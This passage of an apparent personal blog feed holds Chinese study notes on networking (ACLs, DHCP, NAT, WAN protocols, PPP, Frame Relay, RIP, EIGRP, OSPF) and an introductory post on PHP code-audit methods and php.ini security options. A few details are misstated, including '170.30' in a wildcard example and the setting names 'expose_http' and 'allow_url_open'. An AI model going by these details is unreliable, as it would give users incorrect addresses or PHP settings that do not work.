speed</li></ul></li><li>Identify standard and extended ACLs<ul><li>Use a number</li><li>Use a name</li></ul></li></ul><blockquote><p>Standard : 1-99, 1300-1999</p><p>Extended : 100-199, 2000-2699</p></blockquote><h2 id="Wildcard-Bits-Check-the-corresponding-address-bits"><a href="#Wildcard-Bits-Check-the-corresponding-address-bits" class="headerlink" title="Wildcard Bits : Check the corresponding address bits"></a>Wildcard Bits : Check the corresponding address bits</h2><ul><li>0 代表匹配，1 代表忽略</li><li>Matches all bits : 0.0.0.0</li><li>Ignore all bits : 255.255.255.255</li><li>Example : <ul><li>Address : 172.30.16.0</li><li>Wildcard mask : 0.0.15.255</li><li>前 16 位必须是 170.30，15 表示只检查第三个八位组的前四位，必须和 Address 一样 0001，255 表示第四个八位组不匹配</li></ul></li></ul><h2 id="Testing-Packets-with-Numbered-Extended-ACLs"><a href="#Testing-Packets-with-Numbered-Extended-ACLs" class="headerlink" title="Testing Packets with Numbered Extended ACLs"></a>Testing Packets with Numbered Extended ACLs</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/28.png" alt></p><h1 id="DHCP-Service"><a href="#DHCP-Service" class="headerlink" title="DHCP Service"></a>DHCP Service</h1><h2 id="Features-1"><a href="#Features-1" class="headerlink" title="Features"></a>Features</h2><ul><li>DHCP is built on a client-server model</li><li>Use UDP protocol with port 67,68</li><li>Support <em>automatic allocation</em>, <em>dynamic allocation</em> and <em>manual allocation</em></li></ul><blockquote><p>这是内网服务</p></blockquote><h2 id="DHCP-Process"><a href="#DHCP-Process" class="headerlink" title="DHCP Process"></a>DHCP Process</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/29.png" alt></p><blockquote><p>discover message : 发现 DHCP 服务器，广播发送</p><p>offer message : 包含已分配的 IP 地址，单播发送</p><p>request message : 确认 IP 地址无问题，广播发送( DHCP 服务器不一定是一个，告诉网络中所有的 DHCP 服务器使用哪个 IP 地址 )</p><p>ack message : 确认消息，单播发送</p></blockquote><h1 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h1><h2 id="Network-Address-Translation"><a href="#Network-Address-Translation" class="headerlink" title="Network Address Translation"></a>Network Address Translation</h2><ul><li>网络地址转换，用于修改 IP 数据包中的源、目标地址，比如内网地址转换为外网地址</li><li>为何使用 NAT 技术<ul><li>节省 IP 地址( NAT + VLSM/CIDR )</li><li>可以隐藏内部真实 IP，隐藏了源地址</li><li>NAT TCP 负载均衡</li><li>解决地址冲突问题</li></ul></li></ul><h2 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h2><ul><li>影响路由器性能</li><li>破坏了 IP 的端到端特性</li><li>与一些安全协议不兼容</li></ul><h2 id="NAT-分类"><a href="#NAT-分类" class="headerlink" title="NAT 分类"></a>NAT 分类</h2><ul><li>静态 NAT<ul><li>一对一转换</li><li>手工创建 NAT 映射表</li></ul></li><li>动态 NAT<ul><li>一对一转换</li><li>定义地址池，动态创建 NAT 映射表</li></ul></li><li>PAT<ul><li>多对一转换</li><li>通过端口号标识不同数据流</li></ul></li></ul><blockquote><p>一般静态 NAT 和 动态 NAT 用于解决地址冲突，一般 PAT 用于节约 IP 地址</p><p>可以是内网地址转换为外网地址，也可以是外网地址转换为外网地址</p></blockquote><h2 id="PAT"><a href="#PAT" class="headerlink" title="PAT"></a>PAT</h2><ul><li>为每一个数据流分配一个端口号</li><li>出口是同一个出口，通过分配的端口号识别数据流，并且会记录外部地址和外部端口号</li></ul><h1 id="广域网"><a href="#广域网" class="headerlink" title="广域网"></a>广域网</h1><h2 id="WAN"><a href="#WAN" class="headerlink" title="WAN"></a>WAN</h2><h3 id="WANs-vs-LANs"><a href="#WANs-vs-LANs" class="headerlink" title="WANs vs. LANs"></a>WANs vs. LANs</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/30.png" alt></p><h3 id="WAN-Services"><a href="#WAN-Services" class="headerlink" title="WAN Services"></a>WAN Services</h3><ul><li>Physical : Electrical, mechanical, operational connections</li><li>Data Link : Frame Relay, ATM, HDLC</li></ul><blockquote><p>一般广域网只影响 OSI 的后两层，不影响上层</p></blockquote><h3 id="Physical-Layer-WANs"><a href="#Physical-Layer-WANs" class="headerlink" title="Physical Layer: WANs"></a>Physical Layer: WANs</h3><ul><li>底层一般用串行接口,比如 s0/0</li><li>设备分为 DTE 和 DCE，客户端是 DTE 端，DCE 端提供传输所需要的信息</li></ul><h3 id="WAN-Data-Link-Protocols"><a href="#WAN-Data-Link-Protocols" class="headerlink" title="WAN Data-Link Protocols"></a>WAN Data-Link Protocols</h3><ul><li>HDLC</li><li>PPP：ADSL，3G，GPRS，CMDA</li><li>Frame Relay</li><li>ATM</li><li>ISDN</li></ul><h3 id="WAN-Link-Options"><a href="#WAN-Link-Options" class="headerlink" title="WAN Link Options"></a>WAN Link Options</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/31.png" alt></p><h3 id="WAN-分类"><a href="#WAN-分类" class="headerlink" title="WAN 分类"></a>WAN 分类</h3><ul><li>Closed Network<ul><li>专有网络，应用于银行，军队，政府</li></ul></li><li>Open Network<ul><li>开放网络，比如Internet</li></ul></li></ul><blockquote><p>Internet 属于广域网，广域网不仅仅是 Internet</p></blockquote><h2 id="Internet-Connection"><a href="#Internet-Connection" class="headerlink" title="Internet Connection"></a>Internet Connection</h2><h3 id="DSL-Service-Types-Overview"><a href="#DSL-Service-Types-Overview" class="headerlink" title="DSL Service Types Overview"></a>DSL Service Types Overview</h3><ul><li>一般家庭和中小型企业使用 DSL 接入互联网</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/32.png" alt></p><h3 id="ADSL"><a href="#ADSL" class="headerlink" title="ADSL"></a>ADSL</h3><ul><li>上行速率低，下行速率高</li><li>属于一层技术</li><li>可以在传统的电话线上传输</li><li>上层协议为 PPP 协议</li></ul><h2 id="Serial-Encapsulation"><a href="#Serial-Encapsulation" class="headerlink" title="Serial Encapsulation"></a>Serial Encapsulation</h2><h3 id="Typical-WAN-Encapsulation-Protocols"><a href="#Typical-WAN-Encapsulation-Protocols" class="headerlink" title="Typical WAN Encapsulation Protocols"></a>Typical WAN Encapsulation Protocols</h3><ul><li>Leased Line</li><li>Packet Switching</li><li>Circuit Switching</li><li>Metro Ethernet</li><li>Broadband</li></ul><h3 id="Circuit-Switching"><a href="#Circuit-Switching" class="headerlink" title="Circuit Switching"></a>Circuit Switching</h3><ul><li>需要建立连接( 拨号的过程 )，而且建立连接比较慢</li><li>专属线路</li><li>连接速率比较低</li><li>一般基于 PSTN( Public Switched Telephone Network )</li></ul><h3 id="Leased-Line"><a href="#Leased-Line" class="headerlink" title="Leased Line"></a>Leased Line</h3><ul><li>专线，比如光纤</li><li>速度快，连接简单，质量高</li><li>费用高</li></ul><h3 id="Leased-Line-Encapsulation-Protocols"><a href="#Leased-Line-Encapsulation-Protocols" class="headerlink" title="Leased Line Encapsulation Protocols"></a>Leased Line Encapsulation Protocols</h3><ul><li>平常所说的以太网是应用于局域网中，不再适用于广域网</li><li>对于专线连接，二层通常需要一些特殊的协议。二层的封装不再是以太网封装，就没有 MAC 地址了</li><li>一般默认是 HDLC，但是一般厂商都会改装成私有协议，这样就只适用于相同厂商的设备连接</li><li>对于不同厂商的设备连接，一般使用 PPP 协议，它是一个标准协议</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/33.png" alt></p><h3 id="ATM-and-Cell-Switching"><a href="#ATM-and-Cell-Switching" class="headerlink" title="ATM and Cell Switching"></a>ATM and Cell Switching</h3><ul><li>将数据分为 53 字节的定长数据进行处理</li><li>一般数据处理在硬件中完成，速率很快</li><li>通常用于运营商的内部网络</li></ul><h1 id="PPP"><a href="#PPP" class="headerlink" title="PPP"></a>PPP</h1><h3 id="Features-2"><a href="#Features-2" class="headerlink" title="Features"></a>Features</h3><ul><li>它是一个标准协议</li><li>在广域网中应用范围最广的一个二层协议</li><li>分为 NCP 和 LCP 两个部分</li><li>广泛用于宽带连接，Internet 连接</li></ul><h3 id="PPP-LCP-Options"><a href="#PPP-LCP-Options" class="headerlink" title="PPP LCP Options"></a>PPP LCP Options</h3><ul><li>Authentication：二层认证机制</li><li>Callback：回拨</li><li>Compression：二层压缩机制</li><li>Multilink：多链路</li></ul><h3 id="Laying-PPP-Elements"><a href="#Laying-PPP-Elements" class="headerlink" title="Laying PPP Elements"></a>Laying PPP Elements</h3><p>LCP : 底层协议，用于建立连接、解除连接和连接认证</p><p>NCP : 上层协议，在三层和底层之间做一个衔接</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/34.png" alt></p><h3 id="PAP"><a href="#PAP" class="headerlink" title="PAP"></a>PAP</h3><ul><li>PPP authentication protocol</li><li>Passwords sent in plaintext</li></ul><blockquote><p>单向认证，一方请求认证，一方提交用户名密码</p></blockquote><h3 id="CHAP"><a href="#CHAP" class="headerlink" title="CHAP"></a>CHAP</h3><ul><li>PPP authentication protocol</li><li>Hash values, not actual passwords, are sent across the link</li></ul><blockquote><p>双方都要进行认证，一个类似于三次握手的过程</p></blockquote><h1 id="Frame-Relay"><a href="#Frame-Relay" class="headerlink" title="Frame Relay"></a>Frame Relay</h1><h2 id="Features-3"><a href="#Features-3" class="headerlink" title="Features"></a>Features</h2><ul><li>帧中继协议是二层协议</li><li>早期企业用于替代专线线路的方法</li><li>长距离传输</li><li>使用了虚拟电路(virtual circuits)，将一个线路分为多个虚拟线路，分别分给用户，使用 VC 区分不同用户 </li><li>不支持广播和组播，只支持单播</li></ul><h2 id="Frame-Relay-Terminology"><a href="#Frame-Relay-Terminology" class="headerlink" title="Frame Relay Terminology"></a>Frame Relay Terminology</h2><ul><li>VC 分为 SVC(交换虚链路，临时分配地址) 和 PVC(永久虚链路，固定地址)</li><li>帧中继通过 DLCI 号标识 VC，可以把 DLCI 理解为帧中继的二层编址，只具有本地意义，即只存在于两个设备之间，可以重复</li><li>帧中继封装分为 Cisco 和 IETF 封装</li><li>LMI( 本地管理接口 ) : 两个帧中继设备之间使用的信令标准，可以理解为两种设备之间所说的语言</li></ul><h2 id="Address-Mapping"><a href="#Address-Mapping" class="headerlink" title="Address Mapping"></a>Address Mapping</h2><ul><li>三层使用 IP 地址，二层使用 DLCI 号，这样就存在一个从 IP 地址到 DLCI 号的映射</li><li>这个映射使用 Inverse ARP 来实现动态映射</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ACL&quot;&gt;&lt;a href=&quot;#ACL&quot; class=&quot;headerlink&quot; title=&quot;ACL&quot;&gt;&lt;/a&gt;ACL&lt;/h1&gt;&lt;h2 id=&quot;Features&quot;&gt;&lt;a href=&quot;#Features&quot; class=&quot;headerlink&quot; title=&quot;Featu
      
    
    </summary>
    
      <category term="总结" scheme="http://yoursite.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="总结" scheme="http://yoursite.com/tags/%E6%80%BB%E7%BB%93/"/>
    
      <category term="计算机网络" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计(一)</title>
    <link href="http://yoursite.com/2019/06/03/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%B8%80)/"/>
    <id>http://yoursite.com/2019/06/03/PHP代码审计(一)/</id>
    <published>2019-06-03T10:58:57.814Z</published>
    <updated>2019-06-03T12:33:53.212Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常见-PHP-框架"><a href="#常见-PHP-框架" class="headerlink" title="常见 PHP 框架"></a>常见 PHP 框架</h1><ul><li>ThinkPHP</li><li>Yaf</li><li>Laravel</li><li>Kohana</li><li>Codelgniter</li><li>Yii</li><li>Smyfony</li><li>doitphp</li></ul><blockquote><p>先看用户手册</p></blockquote><h1 id="处理流程"><a href="#处理流程" class="headerlink" title="处理流程"></a>处理流程</h1><p>获取请求 =》全局过滤 =》模块文件 =》C函数内容 =》M函数内容 =》V显示</p><h1 id="网站目录结构"><a href="#网站目录结构" class="headerlink" title="网站目录结构"></a>网站目录结构</h1><ul><li><p>主目录</p></li><li><p>模块目录</p></li><li><p>插件目录</p></li><li><p>上层目录</p></li><li><p>模板目录</p></li><li><p>数据目录</p></li><li><p>配置目录</p></li><li><p>配置文件</p></li><li><p>公共函数文件</p></li><li><p>安全过滤文件</p></li><li><p>数据库结构</p></li><li><p>入口文件</p></li></ul><h1 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法"></a>常见方法</h1><h2 id="通读原文"><a href="#通读原文" class="headerlink" title="通读原文"></a>通读原文</h2><ul><li>函数集文件</li><li>配置文件</li><li>安全过滤文件</li><li>index 文件</li></ul><blockquote><p>适用于比较小的网站或者 CMS</p></blockquote><h2 id="敏感关键字回溯参数"><a href="#敏感关键字回溯参数" class="headerlink" title="敏感关键字回溯参数"></a>敏感关键字回溯参数</h2><p>这是常见方法，但是不能了解程序的基本框架，覆盖不了逻辑漏洞</p><h2 id="查找可控变量"><a href="#查找可控变量" class="headerlink" title="查找可控变量"></a>查找可控变量</h2><ul><li><p>可控变量</p></li><li><p>进入函数的变量</p></li></ul><h2 id="功能点定向审计"><a href="#功能点定向审计" class="headerlink" title="功能点定向审计"></a>功能点定向审计</h2><ul><li>程序安装</li><li>文件上传</li><li>文件管理</li><li>登陆验证</li><li>备份恢复</li><li>找回密码</li></ul><h1 id="PHP核心配置"><a href="#PHP核心配置" class="headerlink" title="PHP核心配置"></a>PHP核心配置</h1><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><ul><li>大小写敏感</li><li>运算符：|, &amp;, ~, !</li><li>空值：foo = ; 或者 foo = none;</li></ul><h2 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式</h2><ul><li><p>安全模式</p><p><code>safe_mode = off</code></p><p>限制文档的存取，限制环境变量的存取，控制外部程序的执行</p><p>在 PHP5.4.0 被移除</p></li><li><p>限制环境变量存取</p><p><code>safe_mode_allowed_env_vars = string</code></p><p>指定 PHP 程序可以改变的环境变量的前缀</p></li><li><p>外部程序执行目录</p><p><code>safe_mode_exec_dir = &quot;path&quot;</code></p></li><li><p>禁用函数</p><p><code>disable_functions =</code> </p></li></ul><h2 id="控制变量"><a href="#控制变量" class="headerlink" title="控制变量"></a>控制变量</h2><ul><li><p>全局变量注册开关</p><p><code>register_globals = off</code></p><p>off 时服务端使用 $_GET[‘name’] 获取数据，on 时服务端通过 POST 或 GET 提交的数据将使用全局变量来接收</p></li><li><p>魔术引号自动过滤</p><p><code>magic_quotes_gpc = on</code></p><p>在 PHP5.4.0 被移除</p></li></ul><h2 id="远程文件"><a href="#远程文件" class="headerlink" title="远程文件"></a>远程文件</h2><ul><li><p>是否允许包含远程文件</p><p><code>allow_url_include = off</code></p></li><li><p>是否允许打开远程文件</p><p><code>allow_url_open = off</code></p></li></ul><h2 id="目录权限"><a href="#目录权限" class="headerlink" title="目录权限"></a>目录权限</h2><ul><li><p>HTTP 头部版本信息</p><p><code>expose_http = off</code></p></li><li><p>文件上传临时目录</p><p><code>upload_tmp_dir =</code> </p></li><li><p>用户可访问目录</p><p><code>open_basedir = path</code></p></li></ul><h2 id="错误信息"><a href="#错误信息" class="headerlink" title="错误信息"></a>错误信息</h2><ul><li><p>内部错误选项</p><p><code>display_errors = on</code></p></li><li><p>错误报告级别</p><p><code>error_reporting = E_ALL&amp;~E_NOTICE</code></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;常见-PHP-框架&quot;&gt;&lt;a href=&quot;#常见-PHP-框架&quot; class=&quot;headerlink&quot; title=&quot;常见 PHP 框架&quot;&gt;&lt;/a&gt;常见 PHP 框架&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;ThinkPHP&lt;/li&gt;
&lt;li&gt;Yaf&lt;/li&gt;
&lt;li&gt;Larav
      
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络总结(三)</title>
    <link href="http://yoursite.com/2019/06/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%80%BB%E7%BB%93(%E4%B8%89)/"/>
    <id>http://yoursite.com/2019/06/03/计算机网络总结(三)/</id>
    <published>2019-06-03T03:00:52.167Z</published>
    <updated>2019-06-06T12:10:15.405Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Static-Routing"><a href="#Static-Routing" class="headerlink" title="Static Routing"></a>Static Routing</h1><h2 id="Router-Operations"><a href="#Router-Operations" class="headerlink" title="Router Operations"></a>Router Operations</h2><ul><li>负责在不同网段之间进行数据转发</li><li>通过路由表进行三层数据转发</li><li>维护路由表信息</li><li>在冗余路径中进行最优路径判断</li><li>在三层转发时应用特定转发策略</li></ul><blockquote><p>路由器默认只知道直连的路由信息，路由器永远是隔离网段的</p></blockquote><h2 id="Static-Routes"><a href="#Static-Routes" class="headerlink" title="Static Routes"></a>Static Routes</h2><ul><li>用于小型网络</li><li>管理员手工配置路由器路由表实现数据转发</li></ul><p>优点</p><ul><li>占用路由器资源小</li><li>可以严格控制路由转发</li><li>支持广泛</li></ul><p>缺点</p><ul><li>网络拓扑变动时无法自动更新</li><li>网络很大时配置维护复杂</li></ul><h2 id="路由器路由条目匹配方式"><a href="#路由器路由条目匹配方式" class="headerlink" title="路由器路由条目匹配方式"></a>路由器路由条目匹配方式</h2><ol><li>对数据进行精确匹配</li><li>只匹配子网掩码规定的位</li><li>匹配最终必须找到一个出接口才能进行转发</li><li>如果没有匹配路由，则丢弃数据包，并向源返回一个 ICMP 错误信息</li><li>路由器递归查找路由表，直到找到一个出接口为止</li></ol><h2 id="Default-Routes"><a href="#Default-Routes" class="headerlink" title="Default Routes"></a>Default Routes</h2><ul><li>缺省路由</li><li>匹配不知道的路由条目</li><li>最不精确，永远是最后匹配</li></ul><h2 id="Load-Balancing"><a href="#Load-Balancing" class="headerlink" title="Load Balancing"></a>Load Balancing</h2><ul><li>负载均衡存在于很多地方，这里仅仅只讨论底层网络的负载均衡</li><li>基于数据包的负载均衡</li><li>基于数据流的负载均衡 (效率更高一些)</li></ul><p>基于数据包 : 以数据包为单位，将数据包分在每个路径上</p><p>基于数据流 : 不同主机到目标主机采用不同的路径</p><h1 id="Dynamic-Routing-Protocol"><a href="#Dynamic-Routing-Protocol" class="headerlink" title="Dynamic Routing Protocol"></a>Dynamic Routing Protocol</h1><h2 id="Routing-Protocol-amp-Routed-Protocol"><a href="#Routing-Protocol-amp-Routed-Protocol" class="headerlink" title="Routing Protocol &amp; Routed Protocol"></a>Routing Protocol &amp; Routed Protocol</h2><ul><li>路由协议用在不同路由器之间，用来判断到远程网络的路径并维护路由器的路由表</li><li>当路径决定之后，路由器会将被路由协议转发到目的网络</li><li>被路由协议一般指三层协议，指的是 IP 协议</li></ul><blockquote><p>被路由协议通过路由协议学习路由进行转发</p></blockquote><h2 id="Dynamic-Routing-Protocol-1"><a href="#Dynamic-Routing-Protocol-1" class="headerlink" title="Dynamic Routing Protocol"></a>Dynamic Routing Protocol</h2><ul><li>动态路由协议是运行在路由器上的一个程序，通过路由器的网络，交换数据包来交换路由信息</li><li>不同路由器之间通过运行的特定协议，相互交换路由信息</li></ul><h2 id="Classful-Routing-有类别路由协议"><a href="#Classful-Routing-有类别路由协议" class="headerlink" title="Classful Routing 有类别路由协议"></a>Classful Routing 有类别路由协议</h2><ul><li>更新中不使用子网掩码</li><li>在一个网络中，只是用相同的子网掩码</li><li>在主类网边界进行自动汇总</li><li>常见协议：RIPv1, IGRP</li></ul><h2 id="Classless-Routing-无类别路由协议"><a href="#Classless-Routing-无类别路由协议" class="headerlink" title="Classless Routing 无类别路由协议"></a>Classless Routing 无类别路由协议</h2><ul><li>更新中携带子网掩码</li><li>支持 VLSM，在同一网络中可以拥有不同子网掩码</li><li>支持手工汇总</li><li>常见协议：RIPv2, EIGRP, OSPF</li></ul><h2 id="最佳路由的判定"><a href="#最佳路由的判定" class="headerlink" title="最佳路由的判定"></a>最佳路由的判定</h2><ul><li><p>Metric(度量值)</p></li><li><p>RIP：Hop Count</p></li><li><p>OSPF：COST(带宽)</p></li><li><p>EIGRP：Bandwidth, Delay</p></li></ul><hr><p>title: 计算机网络总结(四)<br>categories:  </p><ul><li>总结<br>tags:</li><li>总结</li><li>计算机网络</li></ul><hr><h1 id="RIP-Protocol"><a href="#RIP-Protocol" class="headerlink" title="RIP Protocol"></a>RIP Protocol</h1><h2 id="Distance-Vector-Routing-Protocol"><a href="#Distance-Vector-Routing-Protocol" class="headerlink" title="Distance Vector Routing Protocol"></a>Distance Vector Routing Protocol</h2><h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><ul><li>距离矢量型路由信息协议，最根本特点是直接发送路由信息</li><li>RIP 使用跳数( hop )作为度量值</li><li>距离：跳数(源到目标经过了多少三层设备，或者是具有路由功能的设备)</li><li>矢量：出接口</li><li>使用 UDP 协议，端口号 520</li><li>路由器周期性的发送自己的路由表信息，默认周期 30s</li><li>路由器经过多个周期来达到收敛完成(所有路由器路由表完整)</li></ul><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><ul><li>路由环路</li></ul><h2 id="Solution-to-Routing-Loops"><a href="#Solution-to-Routing-Loops" class="headerlink" title="Solution to Routing Loops"></a>Solution to Routing Loops</h2><p>路由环路：收敛速度过慢导致不一致的路由信息，从而导致路由环路，其特征为度量值不断上涨</p><h3 id="Maximum-Hop-Count"><a href="#Maximum-Hop-Count" class="headerlink" title="Maximum Hop Count"></a>Maximum Hop Count</h3><ul><li>定义最大跳数 16，为网络不可达</li></ul><h3 id="Split-Horizon"><a href="#Split-Horizon" class="headerlink" title="Split Horizon"></a>Split Horizon</h3><ul><li>永远不会将一个路由信息从接收这个信息的接口发送出去</li></ul><h3 id="Route-Poisoning-and-Poison-Reverse"><a href="#Route-Poisoning-and-Poison-Reverse" class="headerlink" title="Route Poisoning and Poison Reverse"></a>Route Poisoning and Poison Reverse</h3><ul><li>当网络不可达时将他的度量值置为无穷大，并向外发送出去</li></ul><h3 id="Hold-Down-Timers"><a href="#Hold-Down-Timers" class="headerlink" title="Hold-Down Timers"></a>Hold-Down Timers</h3><ul><li>当收到次优路由时，不立即相信，设置一个抑制计时器，默认 180s，当计时器减到 0 时，更新路由表</li></ul><blockquote><p>次优路由：度量值大，由可达变为不可达</p></blockquote><h3 id="Triggered-Updates"><a href="#Triggered-Updates" class="headerlink" title="Triggered Updates"></a>Triggered Updates</h3><ul><li>The router sends updates when a change in its routing table occurs</li></ul><h1 id="EIGRP-Protocol"><a href="#EIGRP-Protocol" class="headerlink" title="EIGRP Protocol"></a>EIGRP Protocol</h1><h2 id="EIGRP-Features"><a href="#EIGRP-Features" class="headerlink" title="EIGRP Features"></a>EIGRP Features</h2><ul><li>Cisco private protocol</li><li>Advanced distance vector</li><li>Fast convergence</li><li>Support for VLSM and discontiguous subnets</li><li>Partial updates</li><li>Support for multiple network-layer protocols</li><li>Flexible network design</li><li>100% loop-free classless routing</li><li>Multicast and unicast instead of broadcast address</li><li>Loading balancing across equal-cost and unequal-cost pathways</li></ul><blockquote><p>高级的企业级路由选择协议，地位和 OSPF 相当</p></blockquote><h2 id="EIGRP-Neighbor-Table"><a href="#EIGRP-Neighbor-Table" class="headerlink" title="EIGRP Neighbor Table"></a>EIGRP Neighbor Table</h2><ul><li>和所有直连路由器进行条件协商，就是进行条件检查，满足条件才会建立连接关系</li><li>所有邻居保存在 Neighbor Table 中，并通过 Neighbor Table 检查状态</li><li>邻居又叫下一跳</li></ul><h2 id="EIGRP-Topology-Table"><a href="#EIGRP-Topology-Table" class="headerlink" title="EIGRP Topology Table"></a>EIGRP Topology Table</h2><ul><li>所有从邻居学习来的路由全部保存在 Topology Table 中</li></ul><h2 id="EIGRP-Routing-Table"><a href="#EIGRP-Routing-Table" class="headerlink" title="EIGRP Routing Table"></a>EIGRP Routing Table</h2><ul><li>从 Topology Table 中选择最优的，无环的路径保存在 Routing Table 中</li></ul><h2 id="DUAL-Terminology"><a href="#DUAL-Terminology" class="headerlink" title="DUAL Terminology"></a>DUAL Terminology</h2><ul><li>扩散更新算法，EIGRP 底层所使用的算法</li><li>选择到达目标网络最优的，无环路径</li><li>AD = 下一跳路由到达目标网络的开销</li><li>FD = 本地路由器到达目标网络的开销 = AD + 本地路由到达通告给我 AD 的下一跳路由的开销</li><li>Lowest-cost = lowest FD</li><li>successor = 到达目标网络的最优的下一跳路由器</li><li>Feasible successor = 到达目标网络的次优的下一跳路由器</li><li>FC 可行条件 : AD &lt; FDmin，用于防环</li></ul><blockquote><p>当某个路由不可达或没有后继路由会执行一种扩散运算，向所有邻居发送数据，并且必须收到所有回复后才能变为不可达状态</p></blockquote><h2 id="EIGRP-Packets"><a href="#EIGRP-Packets" class="headerlink" title="EIGRP Packets"></a>EIGRP Packets</h2><ul><li>EIGRP数据包直接使用 IP 协议，协议号 88</li></ul><h2 id="EIGRP-Neighbor"><a href="#EIGRP-Neighbor" class="headerlink" title="EIGRP Neighbor"></a>EIGRP Neighbor</h2><p>EIGRP 建立邻接关系的条件：</p><ul><li>AS 号：进程域</li><li>K 值：使用相同的 Metric</li><li>认证</li></ul><h2 id="EIGRP-Metric"><a href="#EIGRP-Metric" class="headerlink" title="EIGRP Metric"></a>EIGRP Metric</h2><ul><li>缺省情况下使用 Bandwith 和 Delay</li><li>不建议使用 Reliability 和 Load，他们是变值</li></ul><h1 id="OSPF-Protocol"><a href="#OSPF-Protocol" class="headerlink" title="OSPF Protocol"></a>OSPF Protocol</h1><h2 id="Features-1"><a href="#Features-1" class="headerlink" title="Features"></a>Features</h2><ul><li>Open protocol</li><li>Link-State routing protocol</li><li>Identify a router uniquely with router-id </li></ul><blockquote><p>高级的企业级路由选择协议，地位和 EIGRP 相当</p><p>router-id : 一般使用 IP 地址</p></blockquote><h2 id="Link-State-Routing-Protocols"><a href="#Link-State-Routing-Protocols" class="headerlink" title="Link-State Routing Protocols"></a>Link-State Routing Protocols</h2><ul><li>每个路由选择由每个路由器独立决策</li><li>相邻路由器相互交换的是链路状态信息，即描述网络拓扑的信息，构成一个 Topological Database</li><li>最终每个路由器都会有一个全网的拓扑结构信息</li><li>每个路由只有在网络拓扑发生变化时才会发送更新</li><li>一般来讲，链路状态协议比距离矢量型协议判断决策更加准确</li></ul><h2 id="Link-State-Data-Structures"><a href="#Link-State-Data-Structures" class="headerlink" title="Link-State Data Structures"></a>Link-State Data Structures</h2><ul><li>邻居表 Neighbor table<ul><li>临接数据库</li><li>保存所有已知邻居</li></ul></li><li>拓扑表 Topology table<ul><li>又称为链路状态数据库( LSDB )</li><li>Contains all routes and their attached links in the area or network</li><li>Identical LSDB for all routers within an area</li></ul></li><li>路由表 Routing table<ul><li>又称为转发数据库( RIB )</li><li>保存到达目标网络的最优路径</li></ul></li></ul><blockquote><p>LSDB 由 LSA 这种数据结构构成，不同的 LSA 描述不同的网络结构信息</p></blockquote><h2 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h2><ul><li>每个路由器需要维护全网拓扑信息</li><li>占用大量内存</li><li>进行路由器计算时占用大量 CPU</li><li>每次路由计算时间较长</li><li>当细节网络出现变动时，全网路由器均需要重新收敛计算</li></ul><h2 id="分层的网络架构"><a href="#分层的网络架构" class="headerlink" title="分层的网络架构"></a>分层的网络架构</h2><ul><li>OSPF 强制使用分层架构</li><li>OSPF 定义了网络双层结构，定义了区域概念，通过区域划分，实现双层的网络架构<ul><li>传输区域 Transit area (骨干区域 backbone or area 0)</li><li>普通区域 Regular area (非骨干区域 nonbackbone areas)</li></ul></li></ul><blockquote><p>OSPF 规定，一个网络可以没有普通区域，但必须且只能有一个骨干区域，即区域 0 </p></blockquote><h2 id="OSPF-Areas"><a href="#OSPF-Areas" class="headerlink" title="OSPF Areas"></a>OSPF Areas</h2><ul><li>所有普通区域内的路由器只维护本区域的链路状态信息，骨干区域内的路由器维护全网的链路状态信息</li><li>不同区域的通信要经过骨干区域转发，即普通区域通过骨干区域互联</li><li>区域的定义是基于接口的，不能把某个路由器完整地放在区域里，只能把路由器的某个接口完整地放在区域里</li></ul><blockquote><p>OSPF 的所有的状态都是基于接口的</p></blockquote><h2 id="OSPF-Packet"><a href="#OSPF-Packet" class="headerlink" title="OSPF Packet"></a>OSPF Packet</h2><ul><li>直接使用 IP 协议，协议号 89</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/26.PNG" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Static-Routing&quot;&gt;&lt;a href=&quot;#Static-Routing&quot; class=&quot;headerlink&quot; title=&quot;Static Routing&quot;&gt;&lt;/a&gt;Static Routing&lt;/h1&gt;&lt;h2 id=&quot;Router-Operations
      
    
    </summary>
    
      <category term="总结" scheme="http://yoursite.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="总结" scheme="http://yoursite.com/tags/%E6%80%BB%E7%BB%93/"/>
    
      <category term="计算机网络" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络总结(二)</title>
